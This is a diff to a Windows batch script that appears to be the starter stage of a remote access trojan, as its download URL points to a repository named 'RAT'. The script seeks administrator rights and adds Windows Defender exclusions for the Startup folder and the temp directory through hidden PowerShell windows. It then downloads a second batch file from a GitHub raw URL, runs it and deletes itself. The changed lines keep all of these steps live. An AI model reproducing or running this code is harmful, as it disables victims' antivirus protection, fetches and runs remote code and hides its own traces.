@@ -2,7 +2,6 @@
 @echo off
 @REM change me
 set "username=saifa"
-set "currentd=%cd%"
 if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) else (
@@ -24,8 +23,9 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
+
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/secondary.bat
-./secondary.bat
+powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
+powershell ./secondary.bat
 del Starter.bat
